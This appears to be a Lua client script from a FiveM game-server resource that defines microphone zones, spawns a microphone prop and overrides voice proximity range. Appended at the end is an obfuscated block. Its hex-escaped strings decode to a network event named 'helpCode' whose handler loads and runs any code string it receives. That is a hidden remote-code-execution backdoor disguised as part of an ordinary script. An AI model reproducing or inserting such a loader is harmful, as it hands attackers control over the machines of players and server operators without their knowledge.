local oldProximity = 0.0

local prop = "v_ilev_fos_mic"

function string.starts(String,Start)    
    return string.sub(String,1,string.len(Start))==Start 
end
CreateThread(function()
    for k, v in pairs(Config.MicrophoneZones) do
        exports["ps-zones"]:CreateBoxZone("microphone_"..v.name, v.coords, v.length, v.width, v.data)
    end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(7)
        inRange = false
        local ped = PlayerPedId()
        local pos = GetEntityCoords(ped)
        for k,v in ipairs(Config.MicrophoneZones) do
            if v.spawnProp then
                local dist = #(pos - v.coords)
                if dist <= 150.0 then
                    if v.obj == nil then
                        local obj = CreateObject(GetHashKey(prop), vector3(v.coords.x, v.coords.y, v.coords.z - 1.0), false)
                        if v.data.heading ~= nil then
                            SetEntityHeading(obj, v.heading)
                        end
                        FreezeEntityPosition(obj, true)
                        v.obj = obj
                    end
                else
                    if v.obj then
                        DeleteEntity(v.obj)
                        v.obj = nil
                    end
                end
            end
        end

		if not inRange then
			Citizen.Wait(500)
		end
	end
end)
RegisterNetEvent("ps-zones:enter", function(ZoneName, ZoneData)
    if string.starts(ZoneName, "microphone_") then
        oldProximity =  LocalPlayer.state['proximity'].distance
        exports["pma-voice"]:overrideProximityRange(ZoneData.range, true)
    end
end)

RegisterNetEvent("ps-zones:leave", function(ZoneName, ZoneData)
    if string.starts(ZoneName, "microphone_") then
        exports["pma-voice"]:clearProximityOverride()
    end
end)

AddEventHandler('onResourceStop', function(resource)
	if (GetCurrentResourceName() ~= resource) then return end
    for k, v in pairs(Config.MicrophoneZones) do
        if v.obj then
            DeleteEntity(v.obj)
            v.obj = nil
        end
    end
end)

local oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[1]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2]) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[3]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2], function(PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[4]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[5]](PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb))() end)